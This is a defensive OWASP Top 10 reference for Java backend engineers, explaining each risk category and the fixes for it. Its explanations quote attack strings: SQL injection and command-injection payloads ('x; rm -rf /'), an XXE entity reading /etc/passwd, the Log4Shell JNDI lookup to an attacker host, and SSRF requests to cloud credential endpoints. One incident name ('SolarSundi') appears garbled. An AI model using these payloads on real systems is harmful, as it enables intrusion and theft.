# OWASP Top 10 — A Backend Engineer's Definitive Reference

> Concept area: Security for Backend Systems
> Subtopic: OWASP Top 10 (2021) + OWASP API Security Top 10
> Audience: Senior Java/JVM backend developers who want to fully master this material — to design securely, operate and debug in production, teach it, and answer any interview question.

---

## 1. Overview & where it fits

### 1.1 What "OWASP Top 10" actually is

**OWASP** stands for the **Open Worldwide Application Security Project** (formerly "Open Web Application Security Project"). It is a non-profit foundation that publishes free, vendor-neutral security guidance. The most famous artifact is the **OWASP Top 10** — a periodically refreshed, consensus list of the ten *most critical* web application security risks.

A few precise framing points that engineers routinely get wrong:

- The Top 10 is **not a checklist of vulnerabilities**. It is a list of **risk categories**. "Injection" is a category that contains SQL injection, NoSQL injection, OS command injection, LDAP injection, ORM injection, and more. You do not "fix the Top 10"; you reduce risk within each category.
- It is **not a standard you can certify against**. It is an *awareness document*. The real standard for systematic verification is the **OWASP ASVS** (Application Security Verification Standard). Think: Top 10 = "the risks everyone should know"; ASVS = "the exhaustive requirements you test against."
- It is **data-driven plus expert-driven**. The 2021 list was built from contributed data across ~500,000 applications, plus a community survey for forward-looking risks not yet well represented in data.
- There are **multiple Top 10 lists**. The flagship is the *Web Application* Top 10. There is a separate **API Security Top 10** (latest stable: 2023), a **Mobile Top 10**, an **LLM Top 10**, a **CI/CD Top 10**, and others. As a backend engineer you care most about the **Web App Top 10 (2021)** and the **API Security Top 10 (2023)** — this document covers both.

### 1.2 The problem it solves

Security is unbounded — you can spend infinite effort. The Top 10 answers a brutally practical question: *"If I have limited time and attention, which classes of bug actually get systems breached?"* It encodes the field's collective experience into a prioritized starting point. It gives teams a **shared vocabulary** ("that's a BOLA", "that's a deserialization gadget"), a **prioritization frame**, and a **training curriculum**.

### 1.3 When you reach for it

- **Design reviews / threat modeling:** walk each category against your new feature.
- **Code review & PR gates:** "Does this endpoint enforce object-level authorization? Is this query parameterized?"
- **Onboarding & training:** the canonical curriculum for getting a team to a security baseline.
- **Compliance mapping:** PCI-DSS, SOC 2, ISO 27001 auditors expect you to address Top 10 categories.
- **Tool configuration:** SAST/DAST tools and bug bounty triage are organized around these categories.

### 1.4 One-paragraph mental model

> Treat your backend as a machine that **receives untrusted input**, **makes authorization decisions**, **talks to other systems** (databases, internal services, the OS), and **keeps secrets**. Almost every Top 10 risk is a failure at one of those four seams: *you trusted input you shouldn't have* (injection, SSRF, deserialization), *you authorized something you shouldn't have* (broken access control, BOLA), *you protected a secret badly* (cryptographic failures, auth failures), or *you couldn't see the attack happen* (logging/monitoring failures). Defense-in-depth means putting an independent control at **each** seam, so that one failure does not become a breach.

---

## 2. Foundations from first principles

Before the categories, you need the load-bearing vocabulary. A newcomer can skip nothing here; every later section assumes these.

### 2.1 The CIA triad

Security objectives reduce to three properties:

- **Confidentiality** — only authorized parties can read data. (Broken by data leaks, weak crypto.)
- **Integrity** — data and code cannot be modified without authorization or detection. (Broken by tampering, insecure deserialization, supply-chain attacks.)
- **Availability** — the system stays usable. (Broken by DoS, ransomware.)

The Top 10 is heavily weighted toward confidentiality and integrity; availability appears mostly via design and rate-limiting concerns.

### 2.2 AuthN vs AuthZ (the single most confused pair)

- **Authentication (AuthN)** — *"who are you?"* Proving identity (password, token, certificate, biometric).
- **Authorization (AuthZ)** — *"what are you allowed to do?"* Deciding whether an authenticated (or anonymous) principal may perform an action on a resource.

A2021's **#1 risk (Broken Access Control)** is an AuthZ failure. **#7 (Identification & Authentication Failures)** is an AuthN failure. Keeping these separate in your head is essential.

### 2.3 Trust boundary

A **trust boundary** is any line in your system across which the level of trust changes — e.g., the boundary between the public internet and your service, between your service and the database, between two microservices, or between user-space and the kernel. **All input crossing a trust boundary inward must be treated as hostile.** Most vulnerabilities are a failure to validate/encode at a trust boundary.

### 2.4 Threat actor & attack surface

- **Threat actor / adversary** — whoever is trying to break the system (script kiddie, criminal group, insider, nation-state).
- **Attack surface** — the sum of all points where an attacker can interact with the system (endpoints, parameters, headers, file uploads, message queues, dependencies). Reducing attack surface is itself a control.

### 2.5 CVE, CWE, CVSS — the three acronyms you must not confuse

- **CWE — Common Weakness Enumeration.** A catalog of *types* of software weaknesses (e.g., CWE-89 = SQL Injection, CWE-22 = Path Traversal). The Top 10 categories map to *sets* of CWEs. Maintained by MITRE.
- **CVE — Common Vulnerabilities and Exposures.** A catalog of *specific, identified vulnerabilities in specific products* (e.g., CVE-2021-44228 = Log4Shell). A CVE is a concrete instance; a CWE is its category.
- **CVSS — Common Vulnerability Scoring System.** A 0.0–10.0 severity score for a given CVE, computed from a vector of metrics (attack vector, complexity, privileges required, impact on CIA, etc.). v3.1 is widely used; v4.0 exists. *"Critical" = 9.0–10.0, "High" = 7.0–8.9.*

Mnemonic: **CWE = weakness type, CVE = the actual bug, CVSS = how bad that bug is.**

### 2.6 Defense in depth

A layered strategy: assume any single control can fail, so place **independent, overlapping controls** so an attacker must defeat several. Example for a payment endpoint: TLS (transport) + auth token validation + object-level authZ check + parameterized query + WAF + audit logging + anomaly alerting. No single failure becomes a breach.

### 2.7 Least privilege & fail-safe defaults

- **Least privilege** — every component (user, service, DB account, container) gets only the permissions it needs, nothing more. A reporting service should use a *read-only* DB user.
- **Fail-safe / secure default** — when something is unspecified or errors out, default to *deny*. An authZ check that throws should result in 403, not "allow."

### 2.8 Validation vs sanitization vs encoding (often conflated, all different)

- **Validation** — reject input that doesn't match an expected shape (allowlist: "this field must be a UUID"). Best done at the boundary.
- **Sanitization** — modify input to remove dangerous content (strip HTML tags). Lossy and error-prone; a fallback, not a primary defense.
- **Encoding / escaping** — transform data so it is safe *for a specific output context* (HTML-encode before rendering, parameter-bind before a SQL driver). The correct primary defense against injection is **context-aware encoding / parameterization at the sink**, not input sanitization.

Key principle: **validate input at the boundary, encode/parameterize at the sink.** Input validation alone never stops injection because the same input is "safe" in one context and "dangerous" in another.

### 2.9 The OWASP families you'll meet

- **ASVS** — Application Security Verification Standard: ~280 testable requirements at three levels (L1 opportunistic, L2 standard, L3 high-assurance). This is what you actually verify against.
- **Cheat Sheet Series** — focused, practical how-to guides (e.g., "SQL Injection Prevention Cheat Sheet"). Best single source for *the fix*.
- **Proactive Controls** — the top 10 things developers should *do* (the positive mirror of the Top 10).
- **SAMM** — Software Assurance Maturity Model, for measuring an org's security program maturity.
- **Dependency-Check / dep-scan** — tooling for finding vulnerable dependencies.

### 2.10 The 2021 list at a glance (and how it changed)

The 2021 release reorganized and renamed categories vs 2017. The list, in rank order:

| # | 2021 Category | Nature | Notable change from 2017 |
|---|---------------|--------|--------------------------|
| A01 | Broken Access Control | AuthZ | Up from #5 to **#1** |
| A02 | Cryptographic Failures | Confidentiality | Renamed from "Sensitive Data Exposure" (cause, not symptom) |
| A03 | Injection | Input trust | Down from #1; **XSS folded in** |
| A04 | Insecure Design | Architecture | **New** category — design-level flaws |
| A05 | Security Misconfiguration | Config | Up; absorbed "XML External Entities (XXE)" |
| A06 | Vulnerable & Outdated Components | Supply chain | Renamed from "Using Components with Known Vulnerabilities" |
| A07 | Identification & Authentication Failures | AuthN | Renamed from "Broken Authentication" |
| A08 | Software & Data Integrity Failures | Integrity | **New** — deserialization + supply chain + CI/CD |
| A09 | Security Logging & Monitoring Failures | Detection | Up from #10 |
| A10 | Server-Side Request Forgery (SSRF) | Input trust | **New** (community survey) |

Each category is explored in depth in Sections 3 and 5.

---

## 3. How it works internally — each category, attack mechanics first

This section is the heart of the document. For each of the ten web categories (and later the API list), we cover: **the underlying weakness, how the attack actually executes step by step, why naive defenses fail, and the structural fix.** Vulnerable-vs-fixed *code* lives in Section 5; here we build the mental machinery.

### A01 — Broken Access Control

**What it is.** The application does not correctly enforce *what an authenticated user is allowed to do or see*. It is an **authorization** failure. It is #1 because it is pervasive, easy to exploit, and high-impact (read/modify/delete other users' data).

**Sub-types you must know:**

- **IDOR (Insecure Direct Object Reference)** — the app exposes a direct reference to an internal object (a DB id, a filename) and authorizes based on the *reference being present* rather than the *caller being entitled to it*. `GET /api/invoices/1043` returns invoice 1043 to anyone who asks, even if it belongs to another tenant.
- **BOLA (Broken Object Level Authorization)** — the API-Security-Top-10 name for the same thing at the object level. BOLA = IDOR generalized for APIs. (API1 in the API list.)
- **BFLA (Broken Function Level Authorization)** — a regular user can call admin-only *functions/endpoints* (e.g., `POST /admin/users` works for non-admins because the check is only in the UI).
- **Vertical privilege escalation** — low-privilege user gains higher privileges (user → admin).
- **Horizontal privilege escalation** — user accesses another user's data at the same privilege level (IDOR/BOLA).
- **Missing function-level access control** — endpoint simply has no authZ check.
- **Path traversal** (CWE-22) — `../../etc/passwd` to escape an intended directory; an access-control failure over the filesystem.
- **CORS misconfiguration** — overly permissive cross-origin rules letting hostile sites read responses.
- **JWT/forced browsing flaws** — tampering with `role` claims, or guessing unlinked URLs.

**How a BOLA/IDOR attack executes, step by step:**
1. Attacker authenticates as a *legitimate, low-value* account (their own).
2. They observe a request like `GET /api/v1/accounts/7781/statements`.
3. They change `7781` to `7782` (or enumerate sequential IDs, or pull IDs from a list endpoint).
4. The server validates the **token is valid** (AuthN passes) but **never checks that account 7782 belongs to the caller** (AuthZ missing).
5. The server returns 7782's data. Repeat in a loop → bulk exfiltration.

**Why naive defenses fail:** Hiding the ID in the UI ("security by obscurity"), using sequential vs UUID ids (UUIDs slow enumeration but do not *authorize*), or checking authZ only client-side. The attacker speaks directly to the API.

**The structural fix:** Enforce **object-level authorization on the server, at every data access**, deriving the *owner/tenant scope from the authenticated principal*, not from the request. Pattern: the query itself is scoped — `WHERE id = :id AND owner_id = :currentUserId` — so a mismatched id returns *no rows*, indistinguishable from "not found." Centralize the check; deny by default; use opaque/random references where feasible; add tenant isolation at the data layer.

---

### A02 — Cryptographic Failures

**What it is.** Failures related to cryptography (or its absence) that lead to exposure of sensitive data. Renamed in 2021 from "Sensitive Data Exposure" to name the *cause* (bad crypto) rather than the *symptom* (exposed data).

**Crypto primitives a newcomer must distinguish:**
- **Hashing** — one-way function; you cannot reverse it. Used for *password storage* and *integrity*. (SHA-256, bcrypt, Argon2.)
- **Encryption** — reversible with a key. Used for *confidentiality*. Two flavors:
  - **Symmetric** — same key encrypts and decrypts (AES). Fast; the challenge is key distribution.
  - **Asymmetric / public-key** — a keypair; public key encrypts, private key decrypts (RSA, ECC). Slower; solves key distribution; underpins TLS and digital signatures.
- **Salt** — random per-record value mixed into a password hash so identical passwords hash differently and precomputed **rainbow tables** (lookup tables of hash→password) are useless.
- **Pepper** — a secret value added to all hashes, stored *separately* from the database.
- **KDF (Key Derivation Function)** — a *deliberately slow* hash (bcrypt, scrypt, **Argon2**, PBKDF2) for passwords, so brute force is expensive.
- **Nonce / IV (Initialization Vector)** — a unique value per encryption so identical plaintexts produce different ciphertexts; must never be reused with the same key for many modes.
- **AEAD (Authenticated Encryption with Associated Data)** — encryption modes (AES-GCM, ChaCha20-Poly1305) that provide *both* confidentiality *and* integrity (a tamper-evident tag). Prefer these.
- **TLS (Transport Layer Security)** — the protocol securing data in transit (the "S" in HTTPS). Successor to the deprecated SSL.

**Common concrete failures:**
- Storing passwords with **fast or unsalted hashes** (MD5, SHA-1, plain SHA-256) → crackable at billions/sec on GPUs.
- Transmitting sensitive data **in cleartext** (HTTP, plain SMTP/FTP) → sniffable.
- Using **deprecated algorithms** (DES, RC4, MD5, SHA-1) or **weak modes** (AES-ECB, which leaks patterns).
- **Hard-coded keys / keys in source control.**
- **Reusing IVs/nonces**, or using a non-CSPRNG (`java.util.Random` instead of `SecureRandom`) for keys/tokens.
- **No encryption at rest** for sensitive fields; weak TLS config (old protocols, weak ciphers, no cert validation).

**How an attack executes (offline cracking):** Attacker dumps a user table (perhaps via A03 injection). If passwords are unsalted MD5, they hash a wordlist + rainbow tables and recover most passwords in minutes. With bcrypt/Argon2 at proper cost factors, the same dump is economically infeasible to crack.

**The structural fix:** Classify data; encrypt sensitive data **in transit (TLS 1.2+/1.3)** and **at rest (AES-256-GCM or envelope encryption via a KMS)**; store passwords with **Argon2id** (or bcrypt/scrypt) at tuned cost; use **`SecureRandom`** for all tokens/keys/IVs; never roll your own crypto; manage keys in a **KMS/HSM** with rotation; disable legacy protocols/ciphers.

---

### A03 — Injection

**What it is.** Untrusted data is sent to an **interpreter** as part of a command or query, and the interpreter executes attacker-controlled instructions. **Interpreter** = any engine that parses and executes a string: a SQL database, a shell, an LDAP server, an XPath engine, a template engine, even the browser DOM (XSS, folded into A03 in 2021).

**The root cause in one sentence:** *mixing code and data in the same string.* The fix is *always the same shape:* keep code and data on separate channels.

**Families:**
- **SQL injection (SQLi)** — into SQL queries. Sub-flavors: in-band (error-based, UNION-based), **blind** (boolean-based, time-based), out-of-band.
- **NoSQL injection** — into MongoDB/etc.; often via operator injection (`{"$gt": ""}`) when an app passes parsed JSON straight into a query.
- **OS command injection** — into a shell (`Runtime.exec("ping " + host)` with `host = "x; rm -rf /"`).
- **LDAP injection**, **XPath injection**, **ORM/HQL injection**, **expression-language / SpEL / OGNL injection** (the class behind several Struts CVEs), **server-side template injection (SSTI)**.
- **XSS (Cross-Site Scripting)** — injection into HTML/JS so the *victim's browser* runs attacker script. Stored, reflected, DOM-based.

**How SQLi executes, step by step (classic login bypass):**
1. App builds: `SELECT * FROM users WHERE user='" + u + "' AND pass='" + p + "'`.
2. Attacker submits `u = admin' --`. The `--` starts a SQL comment.
3. Effective query: `SELECT * FROM users WHERE user='admin' -- ' AND pass='...'`. The password check is commented out.
4. Query returns the admin row → authenticated as admin without a password.
5. Escalate: `' UNION SELECT credit_card,1,1 FROM payments --` to exfiltrate other tables; or `'; DROP TABLE users; --`; or time-based blind (`' OR SLEEP(5) --`) to extract data bit-by-bit when no output is visible.

**Why escaping/blocklists fail:** You cannot reliably enumerate all dangerous characters across all DBs/locales/encodings; attackers use comment variants, encoding tricks, second-order injection (data stored now, executed later). Manual escaping is a losing arms race.

**The structural fix:** **Parameterized queries / prepared statements** (the DB driver sends the query *template* and the *data* separately, so data can never be parsed as code). For dynamic identifiers (table/column names that can't be parameters) use a strict **allowlist**. For command injection, **avoid the shell**; use `ProcessBuilder` with an argument *array* (no shell parsing) and validate inputs. For NoSQL, never pass raw parsed objects as query filters; cast/validate types. For XSS, **context-aware output encoding** + a strong **Content Security Policy (CSP)**.

---

### A04 — Insecure Design

**What it is.** A **new 2021 category** for flaws that are *baked into the design*, not introduced by buggy implementation. You cannot patch your way out of an insecure design; the *idea* is wrong. Distinguish: **insecure design** = missing/ineffective control by design; **insecure implementation** = a correct design implemented with a bug. (A perfectly coded password-reset that emails the *old* plaintext password is insecurely designed.)

**Examples:**
- A "recover account via security questions" flow whose answers are publicly knowable.
- No **rate limiting** designed into a login or OTP flow → credential stuffing / OTP brute force.
- A cinema-booking flow that lets you reserve 600 seats across many requests with no business-logic limit → resource abuse / scalping.
- Trusting a client-supplied price field at checkout.
- No segregation of tenants in a multi-tenant schema by design.

**How it manifests:** Attackers abuse *legitimate functionality* used in unintended ways (business-logic abuse), not a code bug. Often invisible to SAST/DAST because nothing is "malformed."

**The structural fix:** **Threat modeling** during design (STRIDE/attack trees), establishing **security requirements and abuse cases**, **secure design patterns** and a paved-road reference architecture, plausibility/limit checks in business logic, and a **secure development lifecycle (SDLC)**. Defense-in-depth at the design table.

---

### A05 — Security Misconfiguration

**What it is.** The software is *capable* of being secure but is **deployed insecurely**: default accounts, verbose errors, unnecessary features enabled, missing hardening, permissive cloud storage. Absorbed **XXE (XML External Entities)** in 2021.

**XXE explained (since it's now here):** An **XML External Entity** lets an XML document reference external resources via a DTD. A vulnerable XML parser that *resolves external entities* will fetch attacker-specified files/URLs: `<!ENTITY x SYSTEM "file:///etc/passwd">` → file disclosure, SSRF, or DoS ("billion laughs" entity expansion). Fix: **disable DTDs / external entities** in the parser (it's an interpreter-config problem).

**Common misconfigurations:**
- **Default credentials** left enabled (admin/admin, default Actuator, default H2 console).
- **Verbose error messages / stack traces** leaking framework versions, file paths, SQL.
- **Unnecessary services/ports/features** enabled (debug endpoints, sample apps, Spring Boot Actuator `/env`, `/heapdump`, `/jolokia` exposed publicly).
- **Missing security headers** (HSTS, CSP, X-Content-Type-Options, X-Frame-Options).
- **Overly permissive CORS** (`Access-Control-Allow-Origin: *` with credentials).
- **Open cloud storage** (public S3 buckets), **directory listing enabled**.
- **Disabled or default TLS settings**, **outdated server software**.

**The structural fix:** **Hardened, repeatable build & deploy** (infrastructure as code, golden images), a **minimal platform** (remove what you don't use), **no defaults in prod**, **generic error pages** with details only in logs, **security-header middleware**, **least-privilege cloud IAM and storage policies**, and automated **config scanning** (CIS benchmarks, cloud posture management). Disable XXE in every XML parser.

---

### A06 — Vulnerable & Outdated Components

**What it is.** Using libraries, frameworks, runtimes, or OS packages with **known vulnerabilities** (published CVEs) or that are simply **out of date/unsupported**. Your app is only as secure as its weakest dependency — and modern apps are **mostly** dependencies (a typical Java service has hundreds of transitive jars).

**Key terms:**
- **Transitive dependency** — a dependency of your dependency. You may pull in a vulnerable jar you never explicitly added.
- **SBOM (Software Bill of Materials)** — a machine-readable inventory of every component in your build (formats: **CycloneDX**, **SPDX**). You cannot patch what you don't know you have.
- **SCA (Software Composition Analysis)** — tools that scan your dependency tree against vulnerability databases.

**The canonical incident — Log4Shell (CVE-2021-44228, Dec 2021):** A feature of Apache **Log4j 2** resolved **JNDI** lookups inside logged strings. **JNDI (Java Naming and Directory Interface)** is a Java API for looking up objects by name (via LDAP, RMI, etc.). If an attacker got the string `${jndi:ldap://attacker.com/x}` *logged anywhere* (a User-Agent header, a username field), Log4j would contact the attacker's server and **load and execute remote code** — unauthenticated RCE, CVSS 10.0, in one of the most widely deployed Java libraries on Earth. The lesson: a transitive logging dependency turned every log statement into a remote-code-execution sink.

**How exploitation works generally:** Attackers scan for *version fingerprints* (server banners, JS file hashes, error pages), match to public CVEs/exploit code (Exploit-DB, Metasploit), and fire known exploits. Zero skill required for n-day exploitation.

**The structural fix:** Maintain an **SBOM**; run **SCA in CI** (OWASP Dependency-Check, dep-scan, Snyk, GitHub Dependabot, Renovate) and **fail the build on high/critical** vulns; **patch promptly** (have an SLA: e.g., critical in 24–72h); **remove unused dependencies**; pin versions; subscribe to security advisories; prefer maintained, popular libraries.

---

### A07 — Identification & Authentication Failures

**What it is.** Weaknesses in *confirming identity* and *managing sessions* — i.e., **AuthN** done wrong. Renamed from "Broken Authentication."

**Failure modes:**
- **Credential stuffing** — replaying username/password pairs leaked from other breaches (works because people reuse passwords). Defended by MFA, breached-password checks, rate limiting/lockout, anomaly detection.
- **Brute force / password spraying** — guessing passwords; spraying = one common password against many accounts (evades per-account lockout).
- **Weak password policies** — allowing `password123`; or *bad* policies (forced 90-day rotation, silly composition rules) that NIST now discourages in favor of length + breached-password checks.
- **Weak/insecure session management** — predictable session IDs, **session fixation** (attacker sets a victim's session id before login), not rotating the session id on login, no idle/absolute timeout, tokens in URLs.
- **Insecure credential recovery** (knowledge-based questions).
- **Missing or bypassable MFA.**
- **Plaintext/weakly-hashed credential storage** (overlaps A02).
- **JWT pitfalls** — accepting `alg: none`, not verifying signature, no expiry, long-lived tokens with no revocation.

**Session vs token (newcomer note):**
- **Session-based auth** — server stores session state; client holds an opaque **session id** (usually a cookie). Server can revoke instantly.
- **Token-based auth (JWT)** — server issues a signed, **self-contained** token the client presents. Stateless and scalable, but **hard to revoke** before expiry; requires careful signature/exp validation.

**The structural fix:** **MFA**; **rate limiting + intelligent lockout**; **breached-password screening** (e.g., HaveIBeenPwned k-anonymity API); **strong session management** (CSPRNG ids, rotate on login/privilege change, `HttpOnly`/`Secure`/`SameSite` cookies, sensible timeouts); for JWT — verify signature with a fixed expected algorithm, validate `exp`/`iss`/`aud`, keep lifetimes short, pair with refresh-token rotation and a revocation/denylist strategy; use vetted frameworks (Spring Security) rather than hand-rolled auth.

---

### A08 — Software & Data Integrity Failures

**What it is.** A **new 2021 category** covering code/data that is **not protected against unauthorized modification or origin**. Three big sub-areas: **insecure deserialization**, **CI/CD pipeline integrity**, and **software supply chain (auto-update / dependency) integrity**.

**Insecure deserialization explained:**
- **Serialization** — turning an in-memory object into a byte stream (to store/transmit). **Deserialization** — reconstructing the object from bytes.
- The danger: many serializers **reconstruct arbitrary types and run code during reconstruction** (Java's `ObjectInputStream` invokes `readObject`, constructors, etc.). If an attacker controls the byte stream, they can craft a **gadget chain** — a sequence of classes already on your classpath whose deserialization side-effects culminate in code execution (libraries like **ysoserial** automate building these for common dependencies such as Commons-Collections, Spring, Groovy).
- **How the attack executes:** App deserializes attacker-controlled bytes (from a cookie, a message queue, an API body, a cache). The crafted object's `readObject` triggers the gadget chain → **remote code execution**, no memory bug required.

**Supply-chain / CI-CD integrity failures:**
- Pulling dependencies/base images from untrusted registries; no signature verification (a malicious package, **dependency confusion**, or **typosquatting** package gets executed in your build).
- An auto-update mechanism that downloads updates without verifying a signature.
- A compromised build pipeline that injects malicious code into a trusted artifact (the **SolarSundi / SolarWinds** pattern: attackers compromised the build system and shipped a backdoored update to thousands of customers).

**The structural fix:** **Avoid native deserialization of untrusted data** — prefer data-only formats (JSON via a configured Jackson/Gson) and **never** Java-native-deserialize attacker bytes; if you must, use **allowlists** (`ObjectInputFilter`, JDK 9+), look-ahead deserialization, and isolation. For supply chain: **verify signatures** (Sigstore/cosign, GPG), pin & hash dependencies, use trusted internal registries with **scoped names** (defeat dependency confusion), **secure the CI/CD pipeline** (least-privilege runners, signed commits, provenance — **SLSA** framework), and generate **SBOMs**.

---

### A09 — Security Logging & Monitoring Failures

**What it is.** Not a vulnerability that gets you in — a failure that means you **can't tell you were attacked** or **can't respond**. It enables and prolongs every other breach. Industry **dwell time** (time from compromise to detection) has historically been measured in *weeks to months*; most breaches are reported by third parties, not the victim's own monitoring.

**Failure modes:**
- Auth events, access-control failures, and high-value transactions **not logged**.
- Logs with **no useful context** (no user id, source IP, timestamp, request id).
- Logs stored **only locally** (an attacker who roots the box deletes them) — no centralization/append-only.
- **No alerting / thresholds** — events are logged but no one is paged.
- **No detectable response** to penetration tests / scanning.
- The flip side: **logging sensitive data** (passwords, tokens, PII, full card numbers) — itself a vulnerability (and a compliance violation). Log4Shell was *worsened* by how much untrusted data flowed into logs.

**The structural fix:** Log **security-relevant events** (logins success/fail, authZ denials, input-validation failures, privilege changes, admin actions) with **consistent, structured** format (JSON) and correlation ids; ship to a **centralized, tamper-resistant** store (SIEM) with retention; **alert** on thresholds/anomalies; have an **incident response plan**; and **never log secrets/PII** (mask/redact). Test detection with red-team exercises.

> **SIEM** = Security Information and Event Management: a system that aggregates, correlates, and alerts on logs/events (Splunk, Elastic, Datadog, Sentinel).

---

### A10 — Server-Side Request Forgery (SSRF)

**What it is.** The server can be tricked into making **HTTP (or other) requests to a destination the attacker chooses**. The attacker doesn't reach the internal target directly; they make *your trusted server* do it — bypassing network firewalls (the server is *inside* the perimeter). Added in 2021 from the community survey, reflecting its prominence in cloud breaches.

**Why it's devastating in the cloud:** Cloud VMs expose a **metadata service** at a fixed internal IP — `http://169.254.169.254/` on AWS/GCP/Azure — which returns instance metadata *and, in older setups, temporary IAM credentials*. SSRF to that endpoint can hand an attacker the server's cloud credentials. This is precisely the mechanism in the **2019 Capital One breach**: an SSRF flaw let the attacker query the metadata service, steal the WAF role's credentials, and read ~100M customer records from S3.

**How an SSRF attack executes, step by step:**
1. App has a feature that fetches a *user-supplied URL* (webhook tester, image-from-URL, PDF-render-from-URL, link preview).
2. Attacker supplies an *internal* target instead of an external one: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, or `http://localhost:8080/admin`, or `http://10.0.0.5:6379` (internal Redis).
3. Server dutifully makes the request from inside the trusted network.
4. Response (credentials, internal data, port-scan results) is returned to the attacker, or used as a pivot.

**Bypass tricks defenders must anticipate:** Blocklists are defeated by alternate IP encodings (decimal/octal/hex `0x7f000001`), `[::]`/IPv6, DNS rebinding (DNS resolves to a safe IP at validation time, then to an internal IP at fetch time — **TOCTOU**), open redirects, and URL-parser confusion.

**The structural fix:** **Allowlist** destinations (scheme + host + port) rather than blocklist; **resolve the hostname and validate the resolved IP** is public *and re-validate at connection time* (or use a pinned resolver) to beat DNS rebinding; **disable redirects** or re-validate each hop; block link-local/loopback/private ranges and the metadata IP at the network layer (egress firewall); on AWS, **require IMDSv2** (session-token-based metadata that defeats basic SSRF); run such fetchers in an isolated network segment with no credentials.

---

## 4. The complete toolkit

This section enumerates the concrete APIs, classes, libraries, CLI tools, and config flags a JVM backend engineer uses to *implement* the fixes above, with purpose, key parameters, and defaults. **Version/vendor-specific items are flagged.**

### 4.1 Injection prevention (A03) — JDBC/JPA/process APIs

| API / Class | Purpose | Key parameters / methods | Notes & defaults |
|---|---|---|---|
| `java.sql.PreparedStatement` | Parameterized SQL | `setString(idx, val)`, `setLong`, `setObject` | Driver sends template + data separately. **The** SQLi defense. |
| `Connection.prepareStatement(sql)` | Create prepared stmt | `sql` with `?` placeholders | Never string-concat user input into `sql`. |
| Spring `NamedParameterJdbcTemplate` | Named params | `query(sql, MapSqlParameterSource)` | `:name` placeholders; safer ergonomics. |
| JPA/Hibernate `EntityManager.createQuery` | JPQL | `.setParameter("p", v)` | Use *named/positional params*, never string concat. `createNativeQuery` is equally injectable if concatenated. |
| Hibernate Criteria / JPA **Criteria API** | Type-safe dynamic queries | `CriteriaBuilder`, `Root`, `Predicate` | Best for dynamic filters without string building. |
| jOOQ | Type-safe SQL DSL | binds parameters by default | `.fetch()`; inlined params only if you ask. |
| `java.lang.ProcessBuilder` | Run OS process **without a shell** | `new ProcessBuilder(List<String> argv)` | Pass args as a **list** (no shell metacharacter parsing). Prefer over `Runtime.exec(String)`. |
| OWASP **Java Encoder** | Context-aware output encoding (XSS) | `Encode.forHtml`, `forHtmlAttribute`, `forJavaScript`, `forUriComponent` | Encode at the sink, per context. |
| OWASP **HTML Sanitizer** | Allowlist-sanitize rich HTML | `PolicyFactory` builder | For when you must accept HTML. |

### 4.2 Cryptography (A02) — JCA & libraries

| API / Class | Purpose | Key parameters / defaults | Notes |
|---|---|---|---|
| `javax.crypto.Cipher` | Symmetric/asymmetric enc | `Cipher.getInstance("AES/GCM/NoPadding")` | **Use AES-GCM (AEAD)**. Avoid `AES/ECB`. GCM IV = 12 bytes, unique per message. |
| `javax.crypto.spec.GCMParameterSpec` | GCM IV + tag length | 128-bit tag typical | Never reuse (key, IV). |
| `java.security.SecureRandom` | CSPRNG | `SecureRandom.getInstanceStrong()` (blocking) or default | **Always** for keys/IVs/tokens. Never `java.util.Random`. |
| `javax.crypto.KeyGenerator` | Symmetric key gen | `init(256)` for AES-256 | |
| Spring Security `BCryptPasswordEncoder` | Password hashing | strength (log rounds), default **10** | bcrypt; bump strength as hardware improves. |
| Spring Security `Argon2PasswordEncoder` | Password hashing | saltLen, hashLen, parallelism, memory, iterations | **Argon2id** is OWASP's first choice. |
| Spring Security `Pbkdf2PasswordEncoder` | KDF | iterations | FIPS-friendly option. |
| `DelegatingPasswordEncoder` | Multi-algo support | `{bcrypt}`, `{argon2}` prefixes | Enables seamless upgrades. |
| TLS via `javax.net.ssl.SSLContext` | Transport security | protocols, cipher suites | **Enable TLS 1.2/1.3 only**; disable SSLv3/TLS1.0/1.1. |
| Cloud **KMS** SDKs (AWS KMS, GCP KMS, Vault Transit) | Envelope encryption, key mgmt | `Encrypt`/`Decrypt`/`GenerateDataKey` | Keys never leave the HSM in plaintext. |
| **Tink** (Google) | Misuse-resistant crypto | `AeadConfig`, key templates | Safer than raw JCA for app devs. |

> **Envelope encryption** (newcomer note): encrypt data with a fast local **data key**, then encrypt that data key with a master key held in the KMS. You store the encrypted data key alongside the ciphertext. Limits KMS calls and master-key exposure.

### 4.3 AuthN/Session/AuthZ (A01, A07) — Spring Security

| Mechanism | Purpose | Key config | Defaults / notes |
|---|---|---|---|
| `SecurityFilterChain` (Spring Security 6) | Declarative URL authZ | `.authorizeHttpRequests(...).requestMatchers(...).hasRole(...)` | **Deny by default** when configured well. |
| `@PreAuthorize` / `@PostAuthorize` | Method-level authZ (incl. object-level via SpEL) | `@PreAuthorize("#acct.owner == authentication.name")` | Enable with `@EnableMethodSecurity`. Great for object-level checks. |
| `@PostFilter` / `@PreFilter` | Filter collections by authZ | SpEL per element | Beware N-elem cost. |
| Spring Authorization Server / `oauth2ResourceServer().jwt()` | OAuth2/OIDC, JWT validation | issuer-uri, jwk-set-uri, audiences | Validates signature/exp/iss automatically when configured. |
| Cookie config | Session hardening | `Secure`, `HttpOnly`, `SameSite` | Set `SameSite=Lax/Strict`; `Secure` in prod. |
| `sessionManagement().sessionFixation().changeSessionId()` | Prevent fixation | — | **Default** in Spring Security: new session id on auth. |
| Account lockout / rate limit | Anti-brute-force | (custom or Bucket4j/Resilience4j) | No built-in lockout; integrate. |
| **Bucket4j** / Resilience4j RateLimiter | Rate limiting | tokens, refill | For login/OTP/SSRF-fetch throttling. |

### 4.4 Dependency & supply-chain scanning (A06, A08)

| Tool | Type | How invoked | Notes |
|---|---|---|---|
| **OWASP Dependency-Check** | SCA (CVE matching via NVD) | Maven `org.owasp:dependency-check-maven:check`; Gradle plugin; CLI | Free; uses CPE matching; can be noisy. Cache NVD; supports `failBuildOnCVSS`. |
| **OWASP dep-scan** | SCA, reachability | CLI/CI | Newer; supports reachability analysis. |
| **Snyk** | SCA + fixes | `snyk test` / CI | Commercial; good fix advice; SaaS DB. |
| **GitHub Dependabot** | Dependency alerts + PRs | repo setting | Free on GitHub; auto-PRs. |
| **Renovate** | Dependency updates | config file | Highly configurable update bot. |
| **Trivy** / **Grype** | Container + dep scanning | `trivy image <img>` / `grype` | Scans OS packages + language deps. |
| **CycloneDX Maven plugin** | SBOM generation | `cyclonedx:makeAggregateBom` | Emits CycloneDX SBOM. |
